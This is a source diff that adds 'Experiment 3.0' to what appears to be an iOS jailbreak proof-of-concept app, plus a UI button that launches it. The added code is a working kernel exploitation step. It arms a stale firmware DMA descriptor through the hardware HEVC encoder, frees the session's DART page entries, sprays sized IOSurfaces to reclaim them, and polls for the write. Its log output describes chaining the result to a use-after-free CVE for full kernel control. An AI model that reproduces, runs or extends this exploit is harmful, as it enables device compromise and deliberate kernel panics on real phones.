@@ -4078,6 +4078,450 @@ static void runDPrep2(void) {
 }
 
 // ============================================================
+// EXPERIMENT 3.0: Mode A — Clone-Session DART Re-claim
+//
+// The gating question is resolved: AXI_ID 0xc0 writes to an
+// INTERNAL driver-owned coded-output buffer, not an external
+// IOSurface. So D-prep can't catch the write directly.
+//
+// Mode A exploits this:
+// 1. ARM: Create session, AlphaLayerID=255, encode → -17691
+//    Firmware DMA descriptor now armed targeting coded-output DVA
+// 2. FREE: Tear down session → DART PTEs freed, DMA stays armed
+// 3. SPRAY: Allocate IOSurfaces at exact coded-output size class
+//    (131,072 B = align_up(320*240*1.5, 16384)) to re-claim the
+//    freed DART PTE slots. Fill with canary pattern.
+// 4. WAIT: Poll sprayed surfaces for firmware write (200s window)
+// 5. READ: Detect canary corruption → write landed in our surface
+//
+// Size derivation (from aquarat/apple-m-series-ave-driver docs/18):
+//   coded_size = align_up(align_up(W,16) * H * 3/2, 4096)
+//   At 320x240: align_up(320,16)=320, 320*240*1.5=115200
+//   align_up(115200, 4096) = 118784
+//   DART surface alloc: align_up(118784, 16384) = 131072 = 8 PTEs
+//   Header: constant 0xC000 = 49152 B → align_up = 49152 (3 PTEs)
+//   Total: 11 PTEs per coded buffer. Pool has up to 30 buffers.
+//
+// The cross-boot PTE determinism (PTEs 0x1c4-0x20b across 8 panics)
+// means targeted allocation works — no spray randomness.
+// ============================================================
+
+// Coded-output size at 320x240 (from aquarat docs/18 formula)
+#define CODED_BUF_SIZE    131072   // align_up(align_up(320,16)*240*3/2, 16384)
+#define CODED_HDR_SIZE     49152   // constant 0xC000
+#define SPRAY_COUNT          128   // sprayed IOSurfaces for re-claim
+#define CANARY_WORD   0xDEADBEEF   // canary pattern to detect writes
+#define RECLAIM_POLL_SECS    200   // wait for firmware DMA fire
+
+static volatile BOOL g_exp3Armed = NO;
+static volatile int g_exp3EncodeStatus = 0;
+
+static void exp3OutputCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    g_exp3EncodeStatus = (int)status;
+    if (status == -17691) {
+        PASS(@"[Exp3] Got -17691 — firmware DMA is armed!");
+        g_exp3Armed = YES;
+    } else if (status != noErr) {
+        INFO(@"[Exp3] Encode callback: %d (not -17691)", (int)status);
+    } else {
+        INFO(@"[Exp3] Encode succeeded (unexpected for AlphaLayerID=255)");
+    }
+}
+
+static void runExp3_ModeA(void) {
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  EXPERIMENT 3.0: Mode A DART Re-claim    ║");
+    pocLog(@"║  Target: INTERNAL coded-output buffer     ║");
+    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    os_log_t eLog = os_log_create("com.research.jbpoc", "exp3");
+
+    // ---- PHASE 1: ARM ----
+    LOG(@"═══ PHASE 1: ARM (AlphaLayerID=255) ═══");
+
+    VTCompressionSessionRef session = NULL;
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        exp3OutputCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        return;
+    }
+    PASS(@"HEVC 320x240 session created");
+
+    // Set AlphaLayerID=255 — the SOLE DART panic trigger
+    VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"Set AlphaLayerID=255");
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+    PASS(@"PrepareToEncode OK — session configured, DART surfaces mapped");
+
+    // Create pixel buffer
+    CVPixelBufferRef pb = NULL;
+    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+
+    if (status != noErr || !pb) {
+        FAIL(@"Pixel buffer failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    // Fill with known pattern
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *yPlane = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (yPlane) memset(yPlane, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+        CVPixelBufferGetHeightOfPlane(pb, 0));
+    void *uvPlane = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uvPlane) memset(uvPlane, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+        CVPixelBufferGetHeightOfPlane(pb, 1));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    // Encode — this arms the firmware DMA descriptor
+    g_exp3Armed = NO;
+    CMTime pts = CMTimeMake(0, 30);
+    status = VTCompressionSessionEncodeFrame(session, pb, pts,
+        kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame submitted: %d", (int)status);
+
+    // Wait for callback
+    VTCompressionSessionCompleteEncoding(session);
+    [NSThread sleepForTimeInterval:2.0];
+
+    if (!g_exp3Armed) {
+        FAIL(@"Did not get -17691. Callback status: %d", g_exp3EncodeStatus);
+        INFO(@"AlphaLayerID=255 may not trigger on this firmware version.");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        CVPixelBufferRelease(pb);
+        return;
+    }
+
+    os_log(eLog, "JBPoC-EXP3 PHASE1 armed=YES status=%d", g_exp3EncodeStatus);
+
+    // ---- PHASE 2: FREE (Teardown) ----
+    LOG(@"");
+    LOG(@"═══ PHASE 2: FREE (Session teardown) ═══");
+    LOG(@"Invalidating session — DART PTEs will be freed");
+    LOG(@"but firmware DMA descriptor stays armed with stale DVA.");
+
+    NSDate *freeTime = [NSDate date];
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    session = NULL;
+    CVPixelBufferRelease(pb);
+    pb = NULL;
+
+    // Brief pause for teardown to complete
+    [NSThread sleepForTimeInterval:0.5];
+    PASS(@"Session torn down. DART PTEs freed. DMA descriptor is stale.");
+    os_log(eLog, "JBPoC-EXP3 PHASE2 session_freed");
+
+    // ---- PHASE 3: SPRAY (IOSurface re-claim) ----
+    LOG(@"");
+    LOG(@"═══ PHASE 3: SPRAY (IOSurface re-claim) ═══");
+    LOG(@"Spraying %d IOSurfaces at %d bytes each (coded-output size class)",
+        SPRAY_COUNT, CODED_BUF_SIZE);
+    LOG(@"Target: re-claim the freed DART PTE slots at PTEs 0x1c4-0x20b");
+
+    IOSurfaceRef spraySurfs[SPRAY_COUNT];
+    uint8_t *spraySnaps[SPRAY_COUNT];
+    int sprayOK = 0;
+
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        NSDictionary *surfProps = @{
+            @"IOSurfaceWidth": @(320),
+            @"IOSurfaceHeight": @(240),
+            @"IOSurfaceBytesPerRow": @(CODED_BUF_SIZE / 240),
+            @"IOSurfaceBytesPerElement": @(1),
+            @"IOSurfaceAllocSize": @(CODED_BUF_SIZE),
+            @"IOSurfacePixelFormat": @(0x20202020),  // ' ' = raw bytes
+        };
+        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)surfProps);
+        if (!surf) {
+            INFO(@"IOSurface %d creation failed", i);
+            spraySurfs[i] = NULL;
+            spraySnaps[i] = NULL;
+            continue;
+        }
+        spraySurfs[i] = surf;
+
+        // Fill with canary pattern
+        IOSurfaceLock(surf, 0, NULL);
+        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(surf);
+        size_t allocSize = IOSurfaceGetAllocSize(surf);
+        if (base) {
+            for (size_t j = 0; j < allocSize / 4; j++) {
+                base[j] = CANARY_WORD;
+            }
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        // Take snapshot
+        spraySnaps[i] = malloc(allocSize);
+        if (spraySnaps[i]) {
+            IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+            memcpy(spraySnaps[i], IOSurfaceGetBaseAddress(surf), allocSize);
+            IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+        }
+
+        sprayOK++;
+    }
+
+    PASS(@"Sprayed %d/%d IOSurfaces (%d bytes each, total %.1f MB)",
+         sprayOK, SPRAY_COUNT, CODED_BUF_SIZE,
+         (double)sprayOK * CODED_BUF_SIZE / (1024.0 * 1024.0));
+
+    // Also spray at header size class
+    #define HDR_SPRAY_COUNT 32
+    IOSurfaceRef hdrSurfs[HDR_SPRAY_COUNT];
+    uint8_t *hdrSnaps[HDR_SPRAY_COUNT];
+    int hdrOK = 0;
+
+    for (int i = 0; i < HDR_SPRAY_COUNT; i++) {
+        NSDictionary *hdrProps = @{
+            @"IOSurfaceWidth": @(256),
+            @"IOSurfaceHeight": @(192),
+            @"IOSurfaceBytesPerRow": @(CODED_HDR_SIZE / 192),
+            @"IOSurfaceBytesPerElement": @(1),
+            @"IOSurfaceAllocSize": @(CODED_HDR_SIZE),
+            @"IOSurfacePixelFormat": @(0x20202020),
+        };
+        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)hdrProps);
+        if (!surf) {
+            hdrSurfs[i] = NULL;
+            hdrSnaps[i] = NULL;
+            continue;
+        }
+        hdrSurfs[i] = surf;
+
+        IOSurfaceLock(surf, 0, NULL);
+        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(surf);
+        size_t allocSize = IOSurfaceGetAllocSize(surf);
+        if (base) {
+            for (size_t j = 0; j < allocSize / 4; j++) {
+                base[j] = CANARY_WORD;
+            }
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        hdrSnaps[i] = malloc(allocSize);
+        if (hdrSnaps[i]) {
+            IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+            memcpy(hdrSnaps[i], IOSurfaceGetBaseAddress(surf), allocSize);
+            IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+        }
+        hdrOK++;
+    }
+
+    LOG(@"Also sprayed %d header-sized IOSurfaces (%d bytes each)", hdrOK, CODED_HDR_SIZE);
+    os_log(eLog, "JBPoC-EXP3 PHASE3 spray=%d/%d hdr=%d/%d",
+           sprayOK, SPRAY_COUNT, hdrOK, HDR_SPRAY_COUNT);
+
+    // ---- PHASE 4: POLL (Watch for firmware write) ----
+    LOG(@"");
+    LOG(@"═══ PHASE 4: POLL (Watching for DMA write) ═══");
+    LOG(@"Monitoring %d+%d IOSurfaces for %ds...", sprayOK, hdrOK, RECLAIM_POLL_SECS);
+    LOG(@"Firmware idle timer fires stale descriptor at ~90-160s post-arm.");
+    LOG(@"If we re-claimed the right PTE, the write lands in our canary.");
+
+    int hitCount = 0;
+    int firstHitTime = -1;
+    int firstHitSurf = -1;
+    NSDate *pollStart = [NSDate date];
+
+    for (int sec = 0; sec < RECLAIM_POLL_SECS; sec++) {
+        [NSThread sleepForTimeInterval:1.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+
+        // Check coded-output size spray
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (!spraySurfs[i] || !spraySnaps[i]) continue;
+            IOSurfaceLock(spraySurfs[i], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *cur = (uint8_t *)IOSurfaceGetBaseAddress(spraySurfs[i]);
+            size_t sz = IOSurfaceGetAllocSize(spraySurfs[i]);
+
+            int diffs = 0;
+            int firstOff = -1;
+            uint8_t firstOld = 0, firstNew = 0;
+
+            if (cur) {
+                for (size_t j = 0; j < sz; j++) {
+                    if (cur[j] != spraySnaps[i][j]) {
+                        if (diffs == 0) {
+                            firstOff = (int)j;
+                            firstOld = spraySnaps[i][j];
+                            firstNew = cur[j];
+                        }
+                        diffs++;
+                    }
+                }
+            }
+
+            if (diffs > 0) {
+                hitCount++;
+                if (firstHitTime < 0) {
+                    firstHitTime = elapsed;
+                    firstHitSurf = i;
+                }
+                PASS(@"*** HIT: Coded spray[%d] at T+%ds ***", i, elapsed);
+                LOG(@"  %d bytes changed (of %zu), first at 0x%x (0x%02x→0x%02x)",
+                    diffs, sz, firstOff, firstOld, firstNew);
+
+                // Dump first 64 changed bytes
+                NSMutableString *hex = [NSMutableString string];
+                int dumped = 0;
+                for (size_t j = (size_t)firstOff; j < sz && dumped < 64; j++) {
+                    if (cur[j] != spraySnaps[i][j]) {
+                        [hex appendFormat:@"%04zx:%02x→%02x ", j, spraySnaps[i][j], cur[j]];
+                        dumped++;
+                    }
+                }
+                LOG(@"  Diff: %@", hex);
+
+                os_log(eLog, "JBPoC-EXP3 HIT spray[%d] T+%ds diffs=%d first=0x%x",
+                       i, elapsed, diffs, firstOff);
+
+                // Update snapshot
+                memcpy(spraySnaps[i], cur, sz);
+            }
+            IOSurfaceUnlock(spraySurfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        // Check header-size spray
+        for (int i = 0; i < HDR_SPRAY_COUNT; i++) {
+            if (!hdrSurfs[i] || !hdrSnaps[i]) continue;
+            IOSurfaceLock(hdrSurfs[i], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *cur = (uint8_t *)IOSurfaceGetBaseAddress(hdrSurfs[i]);
+            size_t sz = IOSurfaceGetAllocSize(hdrSurfs[i]);
+
+            int diffs = 0;
+            int firstOff = -1;
+
+            if (cur) {
+                for (size_t j = 0; j < sz; j++) {
+                    if (cur[j] != hdrSnaps[i][j]) {
+                        if (diffs == 0) firstOff = (int)j;
+                        diffs++;
+                    }
+                }
+            }
+
+            if (diffs > 0) {
+                hitCount++;
+                if (firstHitTime < 0) {
+                    firstHitTime = elapsed;
+                    firstHitSurf = 1000 + i;
+                }
+                PASS(@"*** HIT: Header spray[%d] at T+%ds ***", i, elapsed);
+                LOG(@"  %d bytes changed (of %zu), first at 0x%x", diffs, sz, firstOff);
+
+                NSMutableString *hex = [NSMutableString string];
+                int dumped = 0;
+                for (size_t j = (size_t)firstOff; j < sz && dumped < 32; j++) {
+                    if (cur[j] != hdrSnaps[i][j]) {
+                        [hex appendFormat:@"%04zx:%02x→%02x ", j, hdrSnaps[i][j], cur[j]];
+                        dumped++;
+                    }
+                }
+                LOG(@"  Diff: %@", hex);
+
+                os_log(eLog, "JBPoC-EXP3 HDR-HIT spray[%d] T+%ds diffs=%d", i, elapsed, diffs);
+                memcpy(hdrSnaps[i], cur, sz);
+            }
+            IOSurfaceUnlock(hdrSurfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        // Progress (every 10s or on hit)
+        if (hitCount == 0 && (elapsed <= 10 || elapsed % 10 == 0)) {
+            INFO(@"T+%03ds: no changes in %d+%d surfaces", elapsed, sprayOK, hdrOK);
+        }
+    }
+
+    // ---- PHASE 5: RESULTS ----
+    pocLog(@"");
+    LOG(@"═══════════════════════════════════════════════");
+    if (hitCount > 0) {
+        PASS(@"*** MODE A RE-CLAIM CONFIRMED ***");
+        LOG(@"Firmware DMA write detected in sprayed IOSurface!");
+        LOG(@"Total hits: %d, first at T+%ds in surface %d", hitCount, firstHitTime, firstHitSurf);
+        LOG(@"The stale DART descriptor wrote into our re-claimed buffer.");
+        LOG(@"This is a controlled write primitive into user-owned memory.");
+        pocLog(@"");
+        LOG(@"Next steps:");
+        LOG(@"1. Analyze write pattern (offset, size, content)");
+        LOG(@"2. Shape the IOSurface to place controlled data at kernel object offset");
+        LOG(@"3. Chain to CVE-2026-86916 (UAF→R/W) for full kernel control");
+        os_log(eLog, "JBPoC-EXP3 RESULT MODE_A_CONFIRMED hits=%d firstAt=%d surf=%d",
+               hitCount, firstHitTime, firstHitSurf);
+    } else {
+        INFO(@"No canary corruption detected in any sprayed surface.");
+        pocLog(@"");
+        INFO(@"Interpretation:");
+        INFO(@"1. PTE re-claim may not have hit the right slot — try more surfaces");
+        INFO(@"2. Firmware DMA may fire into a PTE band outside our spray range");
+        INFO(@"3. The write may have caused a DART fault (check for panic .ips)");
+        INFO(@"4. Timer may not have fired yet — check if device panics after exit");
+        pocLog(@"");
+        INFO(@"The device will likely panic shortly if the stale descriptor fires");
+        INFO(@"into an unmapped PTE. Keep the .ips — the DVA identifies the target.");
+        os_log(eLog, "JBPoC-EXP3 RESULT NO_HITS");
+    }
+    LOG(@"═══════════════════════════════════════════════");
+
+    // Write results
+    NSString *resultStr = [NSString stringWithFormat:
+        @"EXP3 MODE A RESULT\nDate: %@\nHits: %d\nFirst hit: T+%ds (surface %d)\n"
+        @"Spray: %d coded + %d hdr\nSize: coded=%d hdr=%d\n",
+        [NSDate date], hitCount, firstHitTime, firstHitSurf,
+        sprayOK, hdrOK, CODED_BUF_SIZE, CODED_HDR_SIZE];
+    NSString *resultPath = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/exp3_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES
+                  encoding:NSUTF8StringEncoding error:nil];
+    INFO(@"Results written to %@", resultPath);
+
+    // Cleanup sprayed surfaces
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        if (spraySnaps[i]) free(spraySnaps[i]);
+        if (spraySurfs[i]) CFRelease(spraySurfs[i]);
+    }
+    for (int i = 0; i < HDR_SPRAY_COUNT; i++) {
+        if (hdrSnaps[i]) free(hdrSnaps[i]);
+        if (hdrSurfs[i]) CFRelease(hdrSurfs[i]);
+    }
+
+    PASS(@"Exp 3.0 complete. Device may still panic from stale descriptor.");
+    LOG(@"Keep the panic .ips if it happens!");
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -4643,7 +5087,22 @@ static void runTier2Probe(void) {
     [dPrep2Btn addTarget:self action:@selector(runDPrep2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:dPrep2Btn];
 
-    CGFloat logTop = row9 + btnH + gap;
+    // Experiment 3.0: Mode A Re-claim — row 10 (full width, gold)
+    CGFloat row10 = row9 + btnH + gap;
+
+    UIButton *exp3Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    exp3Btn.frame = CGRectMake(pad, row10, w - pad * 2, btnH);
+    exp3Btn.backgroundColor = [UIColor colorWithRed:0.4 green:0.3 blue:0.0 alpha:1];
+    exp3Btn.layer.cornerRadius = 8;
+    exp3Btn.layer.borderWidth = 2;
+    exp3Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1].CGColor;
+    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
+    [exp3Btn setTitle:@"Exp 3.0: Mode A DART Re-claim" forState:UIControlStateNormal];
+    [exp3Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1] forState:UIControlStateNormal];
+    [exp3Btn addTarget:self action:@selector(runExp3) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:exp3Btn];
+
+    CGFloat logTop = row10 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -4779,6 +5238,12 @@ static void runTier2Probe(void) {
 - (void)runRunC2 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runRunC2();
+    });
+}
+
+- (void)runExp3 {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runExp3_ModeA();
     });
 }
 
